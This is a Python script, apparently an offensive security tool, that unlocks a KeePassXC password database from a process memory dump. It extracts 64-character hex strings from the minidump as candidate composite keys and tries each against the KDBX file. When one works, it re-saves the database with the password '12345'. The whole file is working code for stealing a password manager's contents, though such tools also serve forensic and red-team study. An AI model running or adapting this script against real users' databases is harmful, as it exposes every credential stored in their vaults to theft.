import argparse
import sys
from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError
from os.path import exists, dirname, basename
import os
import magic
import mmap
import re
import codecs
import string

# strings search implementation in python
# https://stackoverflow-com.translate.goog/questions/17195924/python-equivalent-of-unix-strings-utility
def strings(filename, min=4):
    with open(filename, errors="ignore") as f:
        result = ""
        for c in f.read():
            if c in string.printable:
                result += c
                continue
            if len(result) >= min:
                yield result
            result = ""
        if len(result) >= min:
            yield result

# command line arguments parsing            
parser_desc = 'Tries to unlock a KDBX database from a KeePassXC process dump'
parser = argparse.ArgumentParser(add_help = True, description = parser_desc)
parser.add_argument('dump_file', action='store', help='<dump path>')
parser.add_argument('kdbx_file', action='store', help='<database path>')

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

if exists(options.dump_file):
    dump_file_path = options.dump_file
else:
    print('[-] {} not found'.format(options.dump_file))
    exit()

if exists(options.kdbx_file):
    database_path = options.kdbx_file
else:
    print('{} not found'.format(options.kdbx_file))
    exit()

if not 'Mini DuMP' in magic.from_file(dump_file_path):
    print('[*] {} does not look like a minidump file 🤔'.format(dump_file_path))

if not 'KDBX' in magic.from_file(database_path):
    print('[*] {} does not look like a KeePass database 🤔'.format(database_path))

# extracts sha256-like strings from KeePassXC process dump
print('[+] Searching for a composite key in the memory dump... ')
composite_key_candidates = []
for ascii_string in strings(dump_file_path, 64):
    matches = re.findall(r'[a-f0-9]{64}',ascii_string)
    regex = re.compile(r'[a-f]{64}')
    matches = [i for i in matches if not regex.match(i)]
    regex = re.compile(r'[0-9]{64}')
    matches = [i for i in matches if not regex.match(i)]
    if matches:
        for match in matches:
            composite_key_candidates.append(match)

if composite_key_candidates:
    print('[+] {} candidates found, passing them to the database'.format(len(composite_key_candidates)))
else:
    print('[-] no composite key candidate found in dump')
    exit()

# pass composite key candidates to the database using a customized version of pykeepass
found = False
for composite_key_candidate in composite_key_candidates:
    try:
        kp = PyKeePass(database_path, password=composite_key_candidate)
    except CredentialsError:
        pass
    else:
        found = True
        break

if found:
    print('[+] Found a valid composite key !'.format(composite_key_candidate))
else:
    print('[-] No valid composite key found, you may want to try with another dump')
    exit()

# if a valid composite key is found, saves the database with password 12345
kp.password = '6860d0f5d9c4b0db633527188db9209c5bd0355bfeb530c900be4d87c859e0ef' # composite key for password 12345
unlocked_path = os.path.dirname(database_path) + os.path.basename(database_path).split('.')[0] + '_unlocked.' + os.path.basename(database_path).split('.')[1]
kp.save(filename=unlocked_path)
print("[+] Saved database as '{}' with password 12345".format(unlocked_path))